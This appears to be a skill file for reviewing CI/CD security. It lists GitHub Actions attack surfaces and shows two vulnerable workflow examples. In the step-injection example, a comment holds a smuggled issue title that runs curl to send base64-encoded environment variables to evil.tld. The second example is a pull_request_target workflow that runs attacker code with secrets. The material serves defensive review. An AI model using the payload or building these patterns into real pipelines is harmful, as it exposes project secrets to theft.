# SKILL: CI/CD Pipeline Review
## Version: 1.0 | Domain: scr

---

## ATTACK SURFACE
- **Secrets in env vars** — exposed via `env:` print or build artifacts
- **Public PR triggers** — `pull_request_target` runs with secrets even on fork PRs (GitHub Actions classic)
- **Cache poisoning** — write to actions/cache from untrusted job
- **Self-hosted runners** — non-ephemeral; persistent foothold
- **Token scope** — `${{ secrets.GITHUB_TOKEN }}` defaulting to write-all
- **Step injection** — `${{ github.event.issue.title }}` interpolated as bash
- **Workflow command injection** — `::set-output name=x::EVIL` from controlled input
- **Pinned action versions** — using `uses: actions/checkout@main` instead of SHA
- **Third-party action review** — supply chain
- **Artifact upload of source code** — sometimes contains secrets baked in

## EXAMPLES
### Step injection (GitHub Actions)
```yaml
- name: Comment
  run: echo "${{ github.event.issue.title }}"  # title="\\"; curl evil.tld/$(env|base64); echo \\""
```

### pull_request_target abuse
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker code
      - run: npm test  # runs attacker's test code with secrets
```

## TOOLS
- gato (gitlab attack toolkit)
- harden-runner (Step Security)
- semgrep --config=p/github-actions
- raven (CycodeLabs) for GitHub Actions analysis

## REFERENCES
Security Lab — PoisonPill • Praetorian's CI/CD security research
